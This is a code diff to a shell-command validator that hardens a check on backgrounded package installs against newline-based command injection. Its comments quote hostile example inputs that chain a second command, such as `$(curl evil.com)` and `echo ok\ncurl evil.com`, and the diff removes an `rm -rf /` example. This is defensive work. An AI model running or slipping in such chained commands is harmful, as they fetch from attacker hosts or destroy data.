@@ -809,7 +809,7 @@ export function isSafeBackgroundedInstall(command: string): boolean {
   // Trailer must be a single echo statement with safe content. Any other
   // structure (extra `&`, `;`, `|`, command substitution, backticks) is
   // rejected so we don't accidentally let through chained commands like
-  // `pnpm add foo & echo "ok"; rm -rf /` or
+  // `pnpm add foo & echo ok; <chained>` or
   // `pnpm add foo & echo "$(curl evil.com)"`.
   //
   // Forbid these anywhere in the trailer, even inside quotes — bash expands
@@ -817,13 +817,21 @@ export function isSafeBackgroundedInstall(command: string): boolean {
   if (/[`;|&]/.test(trailer)) return false;
   if (/\$\(|\$\{/.test(trailer)) return false;
 
-  // Optional leading newline / escaped newline between `&` and `echo`.
-  // Then a single `echo` with EITHER:
+  // Strip ONE optional leading newline (literal `\n` or escaped `\\n`) so
+  // patterns like `& \necho "..."` still validate. After this, no further
+  // newlines are permitted: bash treats newlines as command terminators,
+  // so any internal `\n` in the trailer would let an attacker append a
+  // second command (e.g. `echo ok\ncurl evil.com`).
+  const trimmed = trailer.replace(/^(?:\\n|\n)\s*/, '');
+  if (/[\n\r]/.test(trimmed)) return false;
+
+  // Single `echo` with EITHER:
   //   - a double-quoted string with no `$`-expansion except `$!`, `$?`, `$$`, or `$<digit>`
   //   - a single-quoted string (literal, no expansion)
-  //   - bare alphanumeric/punctuation text
-  const echoMatch = trailer.match(
-    /^(?:\\n|\n)?\s*echo\s+(?:"([^"]*)"|'([^']*)'|([A-Za-z0-9_:.,!?\-+/=\s]*))$/,
+  //   - bare alphanumeric/punctuation text (note: ` ` is the ONLY whitespace
+  //     allowed here — `\s` would also match `\n` and re-open the bypass)
+  const echoMatch = trimmed.match(
+    /^echo +(?:"([^"]*)"|'([^']*)'|([A-Za-z0-9_:.,!?\-+/= ]*))$/,
   );
   if (!echoMatch) return false;
 
